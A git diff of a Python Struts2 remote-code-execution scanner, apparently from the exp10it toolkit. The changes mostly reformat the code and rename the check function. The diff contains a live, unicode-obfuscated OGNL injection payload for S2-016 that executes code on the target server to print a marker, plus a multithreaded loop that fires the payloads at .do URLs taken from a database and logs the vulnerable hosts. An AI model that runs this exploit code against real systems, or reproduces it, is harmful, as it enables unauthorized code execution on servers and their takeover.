@@ -1,13 +1,16 @@
 # Name:Struts2远程代码执行集合
 # Descript:可直接执行任意代码,进而直接导致服务器被入侵控制.
 # refer:https://raw.githubusercontent.com/boy-hack/w8scan/master/py/poc/st2_eval.py
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 import sys
 import re
+import os
 from urllib.parse import urlparse
 from exp10it import get_target_urls_from_db
 from exp10it import CLIOutput
-modulePath = __file__[:-len(__file__.split("/")[-1])]
+current_dir = os.path.split(os.path.realpath(__file__))[0]
 flag_list = {
     "S2_016": {"poc": [
         "redirect:${%23out%3D%23\\u0063\\u006f\\u006e\\u0074\\u0065\\u0078\\u0074.\\u0067\\u0065\\u0074(new \\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067(\\u006e\\u0065\\u0077\\u0020\\u0062\\u0079\\u0074\\u0065[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).\\u0067\\u0065\\u0074\\u0057\\u0072\\u0069\\u0074\\u0065\\u0072(),%23\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e(\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067(\\u006e\\u0065\\u0077\\u0020\\u0062\\u0079\\u0074\\u0065[]{46,46,81,116,101,115,116,81,46,46})),%23\\u0072\\u0065\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074,%23\\u006f\\u0075\\u0074\\u002e\\u0063\\u006c\\u006f\\u0073\\u0065()}"],
@@ -32,7 +35,7 @@ target = sys.argv[1]
 urls = get_target_urls_from_db(target, "exp10itdb")
 urls.append(target)
 
-check_url_list=[]
+check_url_list = []
 for eachUrl in urls:
     if "^" in eachUrl:
         eachUrl = eachUrl.split("^")[0]
@@ -41,7 +44,8 @@ for eachUrl in urls:
     if re.search("\.do$", url):
         check_url_list.append(url)
 
-def check_vul(url):
+
+def check(url):
     for ver in flag_list:
         for poc in flag_list[ver]['poc']:
             try:
@@ -52,13 +56,15 @@ def check_vul(url):
                     request = urllib.request.Request(url, poc)
                 res_html = urllib.request.urlopen(request).read(204800)
                 if flag_list[ver]['key'] in res_html:
-                    string_to_write = "Congratulations! 存在struts2漏洞! ver:%s\npoc:\n%s" % (ver, poc)
+                    string_to_write = "Congratulations! 存在struts2漏洞! ver:%s\npoc:\n%s" % (
+                        ver, poc)
                     CLIOutput.good_print(string_to_write)
-                    with open("%sresult.txt" % modulePath, "a+") as f:
+                    with open("%s/result.txt" % current_dir, "a+") as f:
                         f.write(string_to_write)
             except:
                 pass
 
+
 from concurrent import futures
 with futures.ThreadPoolExecutor(max_workers=15) as executor:
-    executor.map(check,check_url_list)
+    executor.map(check, check_url_list)
